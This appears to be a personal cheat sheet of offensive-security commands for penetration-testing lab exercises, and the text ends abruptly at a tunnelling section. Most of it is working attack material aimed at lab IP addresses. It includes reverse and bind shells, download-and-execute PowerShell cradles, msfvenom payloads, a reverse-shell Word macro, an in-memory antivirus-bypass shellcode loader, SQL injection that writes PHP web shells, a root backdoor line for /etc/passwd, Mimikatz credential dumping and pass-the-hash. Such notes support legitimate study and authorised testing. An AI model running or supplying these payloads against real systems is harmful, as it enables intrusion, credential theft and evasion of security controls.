# Offensive-Security Exercises Command Report

## Bash 

### Download or make many files at once

`
mkdir -p test/{recon,exploit,report}
`

### Systemctl file state
`systemctl list-unit-files`

### Display proccess id
`echo "$$"`

### Export command
`export othervar="Global Var"`

### Nano shortcut
`Ctrl + K to cut the current line, Ctrl + U to un-cut a line and paste it at the cursor location`

### Vim shortcut
```
use dd to delete the current line, yy to copy the current line, p to paste the clipboard contents,
x to delete the current character, :w to write the current file to disk and stay in vi, :q! to quit without
```

### Compare files line by line
```
comm a.txt b.txt
comm -12 a.txt b.txt

#  -1              suppress column 1 (lines unique to FILE1)
#  -2              suppress column 2 (lines unique to FILE2)
#  -3              suppress column 3 (lines that appear in both files)
```
### Watch
`watch -n 5 w`

### Sort on specifik colums (Ex sort on 3rd col)
`cat file | sort -k 3`

### axel file downloading
```
axel -a -n 20 -o report_axel.pdf https://www.offensive-security.com/reports/penetration-testing-sample-report-2013.pdf

*-a for progress*
*-n for number of multiples connection*
```

### Alias and unalias
```
alias lsa="ls -lah"
unalias lsa
```

### History in date format
```
export HISTTIMEFORMAT='%F %T '
```

### Socat

#### Socat to connect to remote host
`socat - TCP4:<remote server's ip address>:80`

#### Socat in listening mode
`socat TCP4-LISTEN:443 STDOUT`

#### Socat file transfert
```
socat TCP4-LISTEN:443,fork file:secret_passwords.txt
socat TCP4:10.11.0.4:443 file:received_secret_passwords.txt,create
```

#### Socat Reverse Shells
```
socat -d -d TCP4-LISTEN:443 STDOUT  #(-d -d is to increase verbosity)

socat TCP4:10.11.0.22:443 EXEC:/bin/bash
```

#### Socat Encrypted Bind Shells
```
openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt

cat bind_shell.key bind_shell.crt > bind_shell.pem

socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash

socat - OPENSSL:10.11.0.4:443,verify=0
```

#### Socat local port forwarding
```
socat TCP-LISTEN:80,fork TCP:202.54.1.5:80

#This redirect all 80 connection to 202.54.1.5 80
```

### Powercat Send file 

#### Load powercat (dot sorcing )
```
Get-ExecutionPolicy
Set-ExecutionPolicy Unrestricted

. .\powercat.ps1

```

#### Powercat transfert file
```
#nc should be in listen mode
powercat -c 10.11.0.4 -p 443 -i C:\Users\Offsec\powercat.ps1

```
#### Powercat Reverse Shell (nc is in lestening mode remotely)
`
powercat -c 10.11.0.4 -p 443 -e cmd.exe
`

#### Powercat Bind Shell
`powercat -l -p 443 -e cmd.exe`

#### Powercat Stand-Alone Payloads
```
powercat -c 10.11.0.4 -p 443 -e cmd.exe -g > reverseshell.ps1 (reverseshell.ps1 is the reverse shell payload)

./reverseshell.ps1
```

#### Powercat Encoded Payloads (to avoid AV detection)
`powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge > encodedreverseshell.ps1`

### Powershell

#### Powershell Download file
```
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.16.112/powerUp.ps1','C:\Windows\Temp\test\powerup.ps1')"

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.16.112/jaws-enum.ps1','C:\Windows\Temp\test\jaws-enum.ps1')"

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.16.112/Sherlock.ps1','C:\Windows\Temp\test\Sherlock.ps1')"

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.16.112/windows-exploit-suggester.py','C:\Windows\Temp\test\windows-exploit-suggester.py')"

$url = "http://10.10.16.112/powerUp.ps1";$output = "C:\Users\Chase\Desktop\powerUp.ps1";$wc = New-Object System.Net.WebClient;$wc.DownloadFile($url, $output);


```

#### Powershell Execute remotely
```
powershell -C IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.112/Invoke-PowerShellTcp.ps1')

powershell -C "IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.112/Invoke-PowerShellTcp.ps1')"

powershell -C "IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.112/Sherlock.ps1'); Find-AllVulns "

powershell -C "IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.112/powerUp.ps1');"

powershell -C "IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.112/jaws-enum.ps1');"

powershell -C "IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.112/Sherlock.ps1'); "

powershell -C IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.112/Sherlock.ps1')

powershell -C IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.112/powershell_attack.txt')

```

#### Powershell run function from file
```
powershell -File script.ps1 -Command My-Func
powershell -File Sherlock.ps1 -Command Find-AllVulns
powershell -File jaws-enum.ps1 -OutputFileName Jaws-Enum.txt
```

#### Powershell Encoded shell
```
cat shell3 | iconv --to-code UTF-16LE |   base64 -w 0
powershell -EncodedCommand JwBtAGkAawBlAGYAcgBvAGIAYgBpAG4AcwAuAGMAbwBtACcA
```

#### Powershell exploit Auto-login
```
$passwd = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force;$creds =New-Object System.Management.Automation.PSCredential('administrator', $passwd)

Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.webClient).downloadString('http://10.10.16.112/Invoke-PowerShellTcp.ps1')" -Credential $creds

```

#### Powershell exploit Runas
```
runas /profile /savecred /user:ACCESS\Administrator "cmd /c ping -n 1 10.10.16.112" 

runas /profile /savecred /user:ACCESS\Administrator "powershell -C IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.112/Invoke-PowerShellTcp.ps1')"

runas /user:ACCESS\Administrator /savecred "powershell -C IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.36/Invoke-PowerShellTcp3.ps1')"

```
#### Powershell reverse tcp
```
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII
).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

#### Powershell bind shell 
```
powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
```

## Wireshark
*Filter before capturing packet*
net 10.11.1.0/24

*Filter after capturing packet*
tcp.port == 21

## Tcpdump
### Open pcap file
```
tcpdump -r file.pcap (add -n to avoid dns resolution)

tcpdump -n -r password_cracking_filtered.pcap | awk -F" " '{print $3}' | sort | uniq -c | head
```
### Filter
```
tcpdump -n src host 172.16.40.10 -r password_cracking_filtered.pcap
tcpdump -n dst host 172.16.40.10 -r password_cracking_filtered.pcap
tcpdump -n port 81 -r password_cracking_filtered.pcap

tcpdump -i eth1  -s 1500 port not 22 and port not 53
tcpdump -i any -nn -A port 389 -vv

#This one after captured show list of port 
tcpdump -n -r test.pcap | grep "10.10.10.119.\|127.0.0.1." | awk '{print $5}' | sort -u

#FTP creds
tcpdump -n -r /tmp/test.pcapng  | grep -v "length 0"  | awk '$22!="" {print $0}'

tcpdump -nX -r password_cracking_filtered.pcap (-X for printing both hex and ASCII **packet data**)

*Print packet data (Having ACK and PSH header set = only the data packets)*
tcpdump -A -n 'tcp[13] = 24' -r password_cracking_filtered.pcap
```

## Bash
### Variable comparator
Variable | Description
--------- | -----------
$0 | The name of the Bash script
$1 - $9 | The first 9 arguments to the Bash script
$# | Number of arguments passed to the Bash script
$@ | All arguments passed to the Bash script
$? | The exit status of the most recently run process
$$ | The process ID of the current script
$USER | The username of the user running the script
$HOSTNAME | The hostname of the machine
$RANDOM | A random number
$LINENO | The current line number in the script

### Read input
`
read -sp 'Password: ' password (-s for silent input)
`

### If statement
`
if [ $age -lt 16 ]; then echo "You might need parental permission to take this course!"; elif echo "ELIF"; fi
`

!EXPRESSION | The EXPRESSION is false.
----------- | -----------
-n STRING  | STRING length is greater than zero
-z STRING  | The length of STRING is zero (empty)
STRING1 != STRING2   | STRING1 is not equal to STRING2
STRING1 = STRING2  | STRING1 is equal to STRING2
INTEGER1 -eq INTEGER2  | INTEGER1 is equal to INTEGER2
INTEGER1 -ne INTEGER2  | INTEGER1 is not equal to INTEGER2
INTEGER1 -gt INTEGER2  | INTEGER1 is greater than INTEGER2
INTEGER1 -lt INTEGER2  | INTEGER1 is less than INTEGER2
INTEGER1 -ge INTEGER2 | INTEGER1 is greater than or equal to INTEGER 2
INTEGER1 -le INTEGER2 | INTEGER1 is less than or equal to INTEGER 2
-d FILE | FILE exists and is a directory
-e FILE | FILE exists
-r FILE | FILE exists and has read permission
-s FILE | FILE exists and it is not empty
-w FILE | FILE exists and has write permission
-x FILE | FILE exists and has execute permission

### Boolean Logical Operations
`
grep $user2 /etc/passwd && echo "$user2 found!" || echo "$user2 not found!"
`

### While
```
while [ <some test> ]; do <perform an action>; done
```

### Functions
```
print_me () {
echo "You have been printed!"
}

print_me

#Function with arguments

pass_arg() {
echo "Today's random number is: $1"
}

pass_arg $RANDOM
```

## Grep
```
grep -o '[^/]*\.megacorpone\.com' index.html | sort -u
```
## SMB 

### SMB file sharing between linux and windows
```
#on linux
/opt/impacket/examples/smbserver.py test . -smb2support -username guest -password guest 

#on windows
net use x: \\10.10.16.112\test  /user:guest guest 
cmd /c "copy firefox.exe_200131_084937.dmp x:\"

#This is for deletion of share 
net use /d \\10.10.16.112\test 

```
## DNS zone transfert
```
host -l <domain name> <dns server address>
host -l megacorpone.com ns1.megacorpone.com
dnsrecon -d megacorpone.com -t axfr
dnsrecon -d megacorpone.com -t axfr -n name_server_ip
dnsenum zonetransfer.me
```

## Nmap vulnerability checking
```
nmap --script vuln 10.11.1.10
nmap --script exploit 10.11.1.10
```

## HTTP Server
```
python -m SimpleHTTPServer 7331
python3 -m http.server 7331
php -S 0.0.0.0:8000
ruby -run -e httpd . -p 9000
busybox httpd -f -p 10000
```

## File transfert with nc
```
#Here A.A.A.A is the ip who want to receive the file
cat file_to_transfter > /dev/tcp/A.A.A.A/1111

#on A.A.A.A
nc -nlvp 1111 > file_to_receive
```

## SQL Injection

### Some coded
```
#Try sql Inject with -1 and -1' (Single quote play a great role)
#Comment at the end, try -- - and # and nothing
-1 order by 1 -- -
-1 order by 10 -- -
-1' order by 1 -- -
-1' order by 10 -- -
-1 union all select 1, 2, 3; #
-1 union all select 1, 2, @@version #
#Get list of databases (schema_name is for database name)
-1 union all select 1, 2, 4,5, GROUP_CONCAT(schema_name  SEPARATOR', '), 6, 7 FROM information_schema.schemata #
#Get current database()
-1 union all select 1, database(), user() #
#Get table list of tables and their columns
-1 union all select 1, 2, 4,5, GROUP_CONCAT(table_name, '::', column_name,'::'  SEPARATOR ';'), 6, 7 FROM information_schema.columns where table_schema != 'information_schema' and table_schema != 'mysql' and table_schema != 'performance_schema' # 


SELECT GROUP_CONCAT(table_name SEPARATOR ';') FROM information_schema.tables WHERE table_schema = 'dvwa';

SELECT GROUP_CONCAT(COLUMN_NAME SEPARATOR ';')  FROM INFORMATION_SCHEMA.COLUMNS   WHERE TABLE_SCHEMA = '_1bd3e0294da19198' AND TABLE_NAME = '__Auth';

SELECT COLLATION_NAME FROM information_schema.columns WHERE TABLE_NAME = '__Auth' AND COLUMN_NAME = 'name';

SELECT name COLLATE utf8mb4_general_ci FROM __Auth;

#utf8mb4_general_ci here is the collation obtained from SELECT COLLATION_NAME Statement

SELECT name COLLATE utf8mb4_general_ci FROM __Auth

#check table name having a specific column name

SELECT TABLE_NAME FROM information_schema.columns WHERE column_name = 'reset_password_key';



-1 union all select 1, 2, table_name from information_schema.tables #

-1 union all select 1, table_name, column_name, 4, 5 from information_schema.columns where table_name='users' #

#Get content of tables 

-1 union all select 1, username, password from users #

#Load file
-1 union all select database(), user(), load_file('/etc/passwd')  #
-1 union all select 1, 2, 3, 4,load_file('/var/www/html/index.php'),6, 7 #
-1 union all select 1, 2, 3, 4,to_base64(load_file('/var/www/html/index.php')),6, 7 #

#Write into file
-1 union all select 1, "<?php echo shell_exec($_GET['cmd']);?>", 3, 4 into OUTFILE '/var/www/html/shell.php' #
-1' union all select%20 '<?php echo shell_exec($_GET["cmd"]);?>' into OUTFILE  'C:/wamp/www/PHP/images/shell.php' -- -
-1' union all select%20 '<?php echo shell_exec($_GET["cmd"]);?>' into OUTFILE  'C:/wamp/www/shell.php' -- -
test' LIMIT 1 INTO OUTFILE 'C:\\inetpub\\wwwroot\\product-453.php' LINES TERMINATED BY 0x3c3f3d60245f4745545b305d603f3e-- -

#Get mysql user and password
-1 union all select 1, 2, 4,5, GROUP_CONCAT(user, '::', host, '::', password  SEPARATOR', '), 6, 7 FROM mysql.user #


#Misc
show variables; 
show @@plugin_dir
```

### From SQL Injection to Code Execution
```
-1 union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts') 
-1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'
```

### Sqlmap
```
sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id" (id is the parameter to test)
sqlmap -r lord_root.txt --level=5 --risk=3 --batch --schema (we can add --dbms=mysql to provide sql DB type)
sqlmap -r lord_root.txt --level=5 --risk=3 --batch -D mysql --tables (here -D is for the database to dump)
sqlmap -r lord_root.txt --level=5 --risk=3 --batch -D mysql -T user --columns
sqlmap -r lord_root.txt --level=5 --risk=3 --batch -D mysql -T user -C User,Password,Select_priv --dump

sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id" --dbms=mysql --os-shell
```

## Buffer Overflow

### nasm shell
```
msf-nasm_shell

- add eax,12
- jmp eax
```

### Msfvenom
```
#linux buffer overflow
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -b "\x00\x20" -f py -v shellcode

#Generate a shell and bind with a legitame app
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-resources/binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe
```

## Client Side attack
MSFVENOM hta-psh, vba, and vba-psh formats are designed for use in client-side attacks by creating either
a malicious HTML Application or an Office macro for use in a Word or Excel document, respectively.

### Client fingerprint
```
#Valve fingerprint
wget https://github.com/Valve/fingerprintjs2/archive/master.zip
```
#### Seach your browser with user agent
https://developers.whatismybrowser.com/useragents/parse/

#### hta attack 
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f hta-psh -o /var/www/html/evil.hta
```

#### Microsoft Word Macro

#### Python script to let the code lenght fit macro requirement
```
str = "powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZQB3AC....."
n = 50
for i in range(0, len(str), n):
	print "Str = Str + " + '"' + str[i:i+n] + '"'
```		

#### Macro skeleton
```
Sub AutoOpen()
	MyMacro
End Sub

Sub Document_Open()
	MyMacro
End Sub

Sub MyMacro()
	Dim Str As String

	'This part is a comment, following line is powershell reverse shell which size is fit by above script 
	Str = "powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZ"
	Str += "QB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBNAGUAbQBvAHIAeQB"
	...
	Str += Str + "QA"

	CreateObject("Wscript.Shell").Run Str
End Sub

```
### Cross-Compiling Exploit Code
```
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32

wine syncbreeze_exploit.exe #(To execute windows exe in Linux)
```

### Windows Downloads Using Scripting Languages
#### Vbs
```
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs

cscript wget.vbs http://10.11.0.4/evil.exe evil.exe
```

#### Powershell
```
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.11.0.4/evil.exe', 'new-exploit.exe')
```

##### Download and execute file
```
powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.11.0.4/helloworld.ps1')
```

#### Exe2hex 
```
upx -9 nc.exe #for file compression
exe2hex -x nc.exe -p nc.cmd

```

### Windows Uploads Using Windows Scripting Languages
```
#In kali on apache2 directory, create upload.php file; the content is as followed
<?php
$uploaddir = '/var/www/uploads/';
$uploadfile = $uploaddir . $_FILES['file']['name'];
move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>

#In windows, run the following 
powershell (New-Object System.Net.WebClient).UploadFile('http://10.11.0.4/upload.php', 'important.docx')

```

## Anti virus bypass
There are 2 ways to do that: On-Disk Evasion and In-Memory Evasion 
This can be usefull to have latest: (github In-Memory Evasion)

### Powershell (in memory)
The following code should be copy and customized in a ps1 shell file 
```
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

$winFunc =Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;

[Byte[]];
[Byte[]]$sc = <place your shellcode here>; #msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f powershell

$size = 0x1000;

if ($sc.Length -gt 0x1000) {$size = $sc.Length};

$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};

$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
```

And run as followed 
`
powershell .\av_shell.ps1
`

If there is execution policy issue (cannot be loaded because running scripts is disabled on this), run in powershell 
`
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
`

### Shellter
After running meterpreter console,
`
set AutoRunScript post/windows/manage/migrate
`
Just after use exploit/multi/handler

## Windows Privilege escalation 

### Check integrity levels
`
whoami /groups
`

### Enumerating the Operating System Version and Architecture
`
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
`

### Enumerating Scheduled Tasks
`schtasks /query /fo LIST /v  | findstr /B /C:"Next Run Time:" /C:"Last Run Time:" /C:"Task To Run:"
`

### Enumerating Readable/Writable Files and Directories (the tool used is from sysinternal)

```
accesschk.exe -uws "Everyone" "C:\Program Files"
accesschk.exe -uws "Everyone" "C:\ProgramData"

or

Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
Get-ChildItem "C:\ProgramData" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
```
### Enumerating Device Drivers and Kernel Modules
`
driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Display Name’, ‘Start Mode’, Path
`

### Enumerating Binaries That AutoElevate (Sudo equivalent)
```
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
```
If this setting is enabled, we could craft an MSI file and run it to elevate our privileges.

### Auto Priv Escalete Info gathering 
```
#windows-privesc-check v2.0 (http://pentestmonkey.net/windows-privesc-check)
windows-privesc-check2.exe -h

windows-privesc-check2.exe --dump -G
```

### Add user in remote users group
```
net localgroup "Remote Desktop Users" UserLoginName  /add
```

### Fake exe to exploit insecure service
```
#include <stdlib.h>

int main () {
int i;
i = system ("net user evil Ev!lpass /add");
i = system ("net localgroup administrators evil /add");
//i = system ("net localgroup 'Remote Desktop Users' evil  /add");
return 0;
}

//i686-w64-mingw32-gcc adduser.c -o adduser.exe
```

### Start and stop service
```
net stop serviio
net start serviio
```
### Get auto running service
`
wmic service where caption="Serviio" get name, caption, state, startmode
`

### Check Admin users
`
net localgroup Administrators
`

## Linux Privilege escalation 

### /etc/passwd writable
```
openssl passwd evil
echo "root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash" >> /etc/passwd
```

## Password Cracking 

### Cewl and john
```
cewl www.megacorpone.com -m 6 -w megacorp-cewl.txt

Add $[0-9]$[0-9] into /etc/john/john.conf and run 

john --wordlist=megacorp-cewl.txt --rules --stdout > mutated.txt
```

### Crunch 
Placeholder | Character Translation
------------ | -------------
@ | Lower case alpha characters
, | Upper case alpha characters
% | Numeric characters
^ | Special characters including space

```
crunch 8 8 -t ,@@^^%%%
crunch 4 6 -f /usr/share/crunch/charset.lst mixalpha -o crunch.txt
```

### John The Ripper
```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT
unshadow passwd-file.txt shadow-file.txt > unshadowed.txt
john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
```

### Remote desktop attack with crowbar
`
crowbar -b rdp -s 10.11.0.22/32 -u admin -C ~/password-file.txt -n 1
`

## Windows Mimikatz, kerberos
```
#With mimikatz
mimikatz.exe
#interact with a process owned by another account
privilege::debug  

#Dump the credentials of all logged-on users using the Sekurlsa
sekurlsa::logonpasswords

#show user's tickets that are stored in memory
sekurlsa::tickets

#show user's tickets that are stored in memory
sekurlsa::tickets

#list and download tickets
kerberos::list
kerberos::list /export

#powershell equivalent of previous command
klist

#Run command remotely with TGT (PsExec uses keberos for auth)
.\PsExec.exe \\dc01 cmd.exe

#Cracking ticket
apt install kerberoast
python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000-Offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi

#Over used the hash
sekurlsa::logonpasswords
sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe

mimikatz# token::elevate
mimikatz# lsadump::sam

#The sam gotten in the LMNT (or NT password)
```
## Windows Pass The Hash
```
#We can pass the hash with the hash gotten with pth-winexe as followed

pth-winexe -U WORKGROUP/offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd

#aad3b435b51404eeaad3b435b51404ee is the empty lm password since the format is LM:NTLM

#Other PassTheHash Technics
pth-wmic -U WORKGROUP/Administrator%aad3b435b51404eeaad3b435b51404ee:C0F2E311D3F450A7FF2571BB59FBEDE5 //192.168.1.25 "select Name from Win32_UserAccount"
pth-wims -U WORKGROUP/Administrator%aad3b435b51404eeaad3b435b51404ee:C0F2E311D3F450A7FF2571BB59FBEDE5 //192.168.1.25 "cmd.exe /c whoami > c:\temp\result.txt"
pth-smbclient -U WORKGROUP/Administrator%aad3b435b51404eeaad3b435b51404ee:C0F2E311D3F450A7FF2571BB59FBEDE5 //192.168.1.25/c$
pth-rpcclient -U WORKGROUP/Administrator%aad3b435b51404eeaad3b435b51404ee:C0F2E311D3F450A7FF2571BB59FBEDE5 //192.168.1.25 
```

### PassTheHash with impacket
`
wmiexec.py  -hashes aad3b435b51404eeaad3b435b51404ee:C0F2E311D3F450A7FF2571BB59FBEDE5 administrator@192.168.1.25
`

### PassTheHash Bruteforce with crackmapexec
`
crackmapexec 10.10.10.10 -u user -H C0F2E311D3F450A7FF2571BB59FBEDE5 
`

## Port Redirection and Tunneling

### Port Forwarding

#### RINETD
```
apt install rinetd
cat /etc/rinetd.conf
# bindadress bindport connectaddress connectport
#Ex: 0.0.0.0 80 216.58.207.142 80
service rinetd restart
```

### SSH Tunneling
 
**When we are dealing with windows, we need to edit SMB protocol on linux to use SMB2 doing the following:**
```
nano /etc/samba/smb.conf
min protocol = SMB2
/etc/init.d/smbd restart
```
#### SSH Local Port  (port is opened locally to access remote local service)
Ex case study:
A B C are 3 hosts, B has access to A and C, A and C are 2 different network. In order to access remote desktop on (3389) on A from C (on a specific port) having an ssh connection to A we run on C
```
ssh -N -L [bind_address:]port:host:hostport [username@address]
ssh -N -L 0.0.0.0:1111:A.A.A.A:3389 b_user@B.B.B.B 
#(-N is not an obligation)

#And then the remote desktop is access on C by 
rdesktop 127.0.0.1:1111
```

#### SSH Remote Port Forwarding (Port is opened remotely to access local service)
Ex case study:
A B are 2 network, B doesn't have ssh but A has. A want to access a private service (running on localhost; example of mysql) on B. Then, B run the following 
```
ssh -N -R 3306:A.A.A.A:1111 a_user@A.A.A.A
#Not forgeting to allow the SMB2 if we're dealing with windows

#The full command to connect on myqsl once remote forward allowed
mysql -u dbuser --port=4001 --host=127.0.0.1 -p 
``` 
**With this configuration, A can access mysql of B on his port 1111**

**_Allow only port forwarding in silent and safe mode_**
```
#In client (-f is for background it will continue even if the session dies)
ssh -f -N -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/keys/id_rsa kali@10.11.0.4

#In server (in ~/.ssh/authorized_keys)
from="10.11.1.250",command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-X11-forwarding,no-pty ssh-rsa ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCxO27JE5uXiHqoUUb4j9o/IPHxsPg+fflPKW4N6pK0ZXSmMfLhjaHyhUr4auF+hSnF2g1hN4N2Z4DjkfZ9f95O7Ox3m0oaUgEwHtZcwTNNLJiHs2fSs7ObLR+gZ23kaJ+TYM8ZIo/ENC68Py+NhtW1c2So95ARwCa/Hkb7kZ1xNo6f6rvCqXAyk/WZcBXxYkGqOLut3c5B+++6h3spOPlDkoPs8T5/wJNcn8i12Lex/d02iOWCLGEav2V1R9xk87xVdI6h5BPySl35+ZXOrHzazbddS7MwGFz16coo+wbHbTR6P5fF9Z1Zm9O/US2LoqHxs7OxNq61BLtr4I/MDnin www-data@ajla

```
#### SSH Dynamic Port Forwarding
This is to access everything via a proxy on a port defined with -D option
```
ssh -N -D 127.0.0.1:8080 student@10.11.0.128
echo "socks4 127.0.0.1 8080" >> /etc/proxychains.conf
proxychains nmap --top-ports=20 -sT -Pn 192.168.1.110
```

##### SSH Dynamic Remote Port Forwarding (Only work on new version of ssh and allow to create tunnel through remote port forwarding)
```
ssh -f -N -R 1080 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /var/lib/mysql/.ssh/id_rsa kali@10.11.0.4

#And then proxychain with 127.0.0.1:1080
```

### PLINK.exe (For Windows)
```
#-l is the username and -pw is the password
cmd.exe /c echo y | plink.exe -ssh -l kali -pw ilak -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4
#We can do the local port forwarding with -L instead of -R
```

### NETSH
```
netsh interface portproxy add v4tov4 listenport=4455 listenaddress=10.11.0.22 connectport=445 connectaddress=192.168.1.110

#Port 4455 will be disabled by default, in order to add it to firewall rule, we do 

netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=10.11.0.22 localport=4455 action=allow

#Don't forget the SMB v2 config on Linux
```

### HTTPTunnel-ing Through Deep Packet Inspection (_It's used with local port forwarding_)
**It is used to send traffic through pure HTTP, bypassing then packet inspection firewall**
For this purpose, we will use httptunnel, which is in 2 tools (**hts** the server and **htc** the client)

For this example, we have A B and C, differents networks having B in common. C wants to communicate with A remote desktop (3389) available for B. But anytraffic a part of http is denied on C. 

In order to overcome this issue, we will configure a local port fowarding on B toward A and an httptunnel server on B so that C the client can send his request through an httptunnel to B. B will receives C request and forward it to A through the local forward.
```
#On B 
ssh -L 0.0.0.0:8888:A.A.A.A:3389 student@127.0.0.1

apt install httptunnel
hts --forward-port localhost:8888 1234 #(To allow C to connect on the httptunnel)

#On C
